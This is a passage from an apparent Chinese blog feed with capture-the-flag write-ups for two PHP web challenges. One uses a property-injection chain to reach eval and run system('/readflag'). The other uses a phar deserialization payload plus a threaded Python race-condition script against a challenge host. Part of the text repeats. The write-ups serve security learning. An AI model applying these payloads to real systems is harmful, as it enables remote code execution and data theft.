href="https://www.cnblogs.com/xiezhengcai/p/3682874.html">正则子组</a>的匹配，以此类推。</p><p>因此这里<code>$matches[1]</code>的内容就是<code>$this-&gt;template</code>变量<code>&#123; &#125;</code>内的内容了</p><p><strong>TestView::renderTableBody</strong></p><p><img src="/images/BUU/20220428155749.png"></p><p><strong>TestView::renderTableRow</strong></p><p><img src="/images/BUU/20220428130922.png"></p><p>最开始是试了直接调用<strong>TestView::renderTableRow</strong>，发现必须得给<code>$row</code>一个值才能跑，这才倒回去找到<strong>TestView::renderTableBody</strong>。</p><p>终于和漏洞点对上频道了，构造最终payload</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=<span class="symbol">TestView</span></span><br><span class="line">properties[template]=&#123;<span class="symbol">TableBody</span>&#125;&amp;properties[data][<span class="number">0</span>]=<span class="number">1</span>&amp;properties[rowHtmlOptionsExpression]=system(<span class="string">&#x27;/readflag&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220428160754.png"></p><p>反弹shell也是可以的</p><p><img src="/images/BUU/20220427183420.png"></p><h1 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h1><p>附件给了dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.2</span>.<span class="number">3</span>-fpm</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /tmp/files/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src /var/www/html/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:root /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 755 /var/www/html &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R www-data:www-data /var/www/html/uploads &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;/security/d&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install nginx -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    /bin/mv -f /tmp/files/default  /etc/nginx/sites-available/default &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    gcc /tmp/files/copyflag.c -o /copyflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 4711 /copyflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /tmp/files &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /var/lib/apt/lists/* &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 700 /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> nginx&amp;&amp;php-fpm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>似乎没有太多重要的信息，回头看首页源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">当前头像：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">&quot;50px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;50px&quot;</span> <span class="attr">src</span>=<span class="string">&quot;uploads/head.png&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传头像&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;png&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2.png&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">&quot;flag&#123;x&#125;&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;1&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;更换头像&quot;&gt;&lt;/p&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>被注释掉的<strong>submit</strong>十分可疑，取消注释后点击抓个包</p><p><img src="/images/BUU/20220503192134.png"></p><p>结合描述似乎能任意文件读取欸，但是flag权限又是700，多半是寄了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="attribute">png</span>=/flag&amp;flag=whatever</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220503192551.png"></p><p>哎呀这不403吗 看一下远方的源码吧佳人们</p><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;请上传头像&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;png&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;uploads/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传成功： &quot;</span>.<span class="variable">$path</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>edit.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">copyflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">filewrite</span>(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">filewrite</span>(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">sleep</span>(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">filewrite</span>(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//不给我看我自己写个flag。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">symlink</span>(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;成功更换头像&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非正常文件，已被删除&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关注<code>symunlink()</code>能利用<code>php://phar</code>协议打phar反序列化，触发<code>flag::__destruct</code>带出flag到<code>/tmp/flag.txt</code>。但由于文件查看始终只能在<code>./upload/head.png</code>页面，因此得把flag也link过来。</p><p>问题就出在这两次<code>filewrite()</code>，flag文件显然会被<code>filewrite()</code>给重写两回啊两回（悲）。因此得利用条件竞争<strong>让flag在被重写后、link前的瞬间再次生成flag文件</strong>将其覆盖，这样<code>symlink()</code>过来的就是真正的flag了。</p><p>先生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flag</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;flag.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>将其上传，之后运行脚本触发竞争</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://912f9400-ae0c-4c61-ba3d-b640de03e880.node4.buuoj.cn:81/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flagtohead</span>():</span><br><span class="line">    data = &#123;<span class="string">&quot;flag&quot;</span>: <span class="string">&quot;233&quot;</span>, <span class="string">&quot;png&quot;</span>: <span class="string">&quot;/tmp/flag.txt&quot;</span>&#125;</span><br><span class="line">    requests.post(url=url + <span class="string">&quot;/edit.php&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">linkphar</span>():</span><br><span class="line">    data = &#123;<span class="string">&quot;flag&quot;</span>: <span class="string">&quot;233&quot;</span>, <span class="string">&quot;png&quot;</span>: <span class="string">&quot;phar://uploads/a265d9cf18104aecd330627f7c1bb7be.png&quot;</span>&#125;</span><br><span class="line">    requests.post(url=url + <span class="string">&quot;/edit.php&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    <span class="built_in">print</span>(requests.get(url + <span class="string">&quot;/uploads/head.png&quot;</span>).text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    threading.Thread(target=flagtohead).start()</span><br><span class="line">    threading.Thread(target=linkphar).start()</span><br><span class="line">    threading.Thread(target=getflag).start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220504153743.png"></p><h1 id="good-luck"><a href="#good-luck" class="headerlink" title="good_luck"></a>good_luck</h1><p>checksec</p><p><img src="/images/BUU/20220429182229.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;warmup-php&quot;&gt;&lt;a href=&quot;#warmup-php&quot; class=&quot;headerlink&quot; title=&quot;warmup-php&quot;&gt;&lt;/a&gt;warmup-php&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://files.buuoj.cn/files/45743698d2fda6f2ee15021bcb38f6f4/2.zip&quot;&gt;题目附件&lt;/a&gt;给了四个&lt;code&gt;class&lt;/code&gt;源码文件，&lt;code&gt;Base&lt;/code&gt;，&lt;code&gt;Filter extends Base&lt;/code&gt;，&lt;code&gt;ListView extends Base&lt;/code&gt;，&lt;code&gt;TestView extends ListView&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
    <category term="upload" scheme="https://www.m0x01sery.com/tags/upload/"/>
    
    <category term="race condition" scheme="https://www.m0x01sery.com/tags/race-condition/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF X FATE 四月防疫挑战赛 web1 &amp; web2</title>
    <link href="https://www.m0x01sery.com/2022/04/28/[DASCTF-FATE]web-pwn/"/>
    <id>https://www.m0x01sery.com/2022/04/28/[DASCTF-FATE]web-pwn/</id>
    <published>2022-04-27T16:00:00.000Z</published>
    <updated>2022-04-28T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h1><p><a href="https://files.buuoj.cn/files/45743698d2fda6f2ee15021bcb38f6f4/2.zip">题目附件</a>给了四个<code>class</code>源码文件，<code>Base</code>，<code>Filter extends Base</code>，<code>ListView extends Base</code>，<code>TestView extends ListView</code></p><p>首先在<code>Base</code>类中找到漏洞点</p><p><img src="/images/BUU/20220427220530.png"></p><p>似乎有<code>eval()</code>和<code>call_user_func_array()</code>两个方向，也不清楚哪个能打通的说</p><span id="more"></span><p>回头看入口文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(function(<span class="variable">$class</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Action</span>(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure><p>开幕日常被自己菜醒〔指一堆函数没见过</p><p><code>spl_autoload_register()</code>函数和<code>__autoload()</code>有异曲同工之妙，多用于动态调用类的场合</p><p>当php引擎第一次使用类<code>A</code>，但是找不到时，会自动调用<code>__autoload()</code>方法，并将类名<code>A</code>作为参数传入。</p><p><code>spl_autoload_register()</code>不会像<code>__autoload()</code>一样自动触发，它只会告诉php引擎一声，要是碰到未定义的类，就中途去执行由参数指定的函数后再继续。这里的函数就多是起<code>require()</code>系列的作用了。</p><p>接下来让传两个参数，<code>action</code>作为将要被实例化的类，<code>properties</code>为一个数组，暂时不知道如何构造，先放着</p><p>又因为<code>TestView</code>类是最终的继承类，拿来实例化再合适不过了的说。</p><p>搜索源码含有<code>run()</code>方法的类，定位到了<code>ListView</code>，从此开始跟进函数调用链</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ListView::run</span><br><span class="line">ListView::renderContent</span><br><span class="line">ListView::renderSection</span><br><span class="line">TestView::renderTableBody</span><br><span class="line">TestView::renderTableRow</span><br><span class="line">Base::evaluateExpression</span><br></pre></td></tr></table></figure><p><strong>ListView::renderContent</strong></p><p><img src="/images/BUU/20220427221752.png"></p><p><code>ob()</code>系列函数是对浏览器输出缓冲区的操作。</p><blockquote><p>ob缓存介绍<br>ob是output buffering的简称，输出缓冲区，缓冲区是通过php.ini中的output_buffering变量控制的。其默认值是off,可以设置为on来打开buffer。打来buffer后，即便程序中没有用ob函数，实际上代码也是使用了缓冲区的。另外，不管php.ini中output_buffering的设置，cli模式下的php始终默认是关闭的。为什么要设计缓冲区呢？简单来说，高速的cpu早早处理完自己的数据，想通过线路传递给用户，但是线路太窄了，一下输送不过去。如果引入缓冲区，cpu可以将快速将生成的数据放入缓冲区，然后自己哪儿凉快儿哪儿呆着歇着去了。缓冲区根据指令适时将数据输出。这个样就合理解决了高速cpu与低速I/O设备的矛盾了。</p><p>ob的基本原则<br>如果ob缓存打开，则echo的数据首先放在ob缓存。如果是header信息，直接放在程序缓存。当页面执行到最后，会把ob缓存的数据放到程序缓存，然后依次返回给浏览器。</p><p>ob的基本作用：<br>1)防止在浏览器有输出之后再使用setcookie()、header()或session_start()等发送头文件的函数造成的错误。其实这样的用法少用为好，养成良好的代码习惯。<br>2)捕捉对一些不可获取的函数的输出，比如phpinfo()会输出一大堆的HTML，但是我们无法用一个变量例如$info=phpinfo();来捕捉，这时候ob就管用了。<br>3)对输出的内容进行处理，例如进行gzip压缩，例如进行简繁转换，例如进行一些字符串替换。<br>4)生成静态文件，其实就是捕捉整页的输出，然后存成文件。经常在生成HTML，或者整页缓存中使用。</p></blockquote><p><code>preg_replace_callback()</code>函数会执行一个正则表达式加工这里的<code>$this-&gt;template</code>，之后将其作为参数传入一个回调函数（此处为<code>$this-&gt;renderSection</code>）进行处理。</p><blockquote><p>这个函数的行为除了可以指定一个 callback 替代 replacement 进行替换字符串的计算，其他方面等同于 preg_replace()。</p><p>如果待匹配目标是一个数组，返回值将也是一个数组，其他情况返回字符串。错误发生时返回NULL。如果查找到了匹配，返回替换后的目标字符串（或字符串数组），其他情况将会无变化返回。</p></blockquote><p><strong>ListView::renderSection</strong></p><p><img src="/images/BUU/20220428111302.png"></p><p>通常这里的<code>$matches[0]</code>保存的是匹配到的片段，<code>$matches[1]</code>是第一个<a href="https://www.cnblogs.com/xiezhengcai/p/3682874.html">正则子组</a>的匹配，以此类推。</p><p>因此这里<code>$matches[1]</code>的内容就是<code>$this-&gt;template</code>变量<code>&#123; &#125;</code>内的内容了</p><p><strong>TestView::renderTableBody</strong></p><p><img src="/images/BUU/20220428155749.png"></p><p><strong>TestView::renderTableRow</strong></p><p><img src="/images/BUU/20220428130922.png"></p><p>最开始是试了直接调用<strong>TestView::renderTableRow</strong>，发现必须得给<code>$row</code>一个值才能跑，这才倒回去找到<strong>TestView::renderTableBody</strong>。</p><p>终于和漏洞点对上频道了，构造最终payload</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=<span class="symbol">TestView</span></span><br><span class="line">properties[template]=&#123;<span class="symbol">TableBody</span>&#125;&amp;properties[data][<span class="number">0</span>]=<span class="number">1</span>&amp;properties[rowHtmlOptionsExpression]=system(<span class="string">&#x27;/readflag&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220428160754.png"></p><p>反弹shell也是可以的</p><p><img src="/images/BUU/20220427183420.png"></p><h1 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h1><p>附件给了dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td 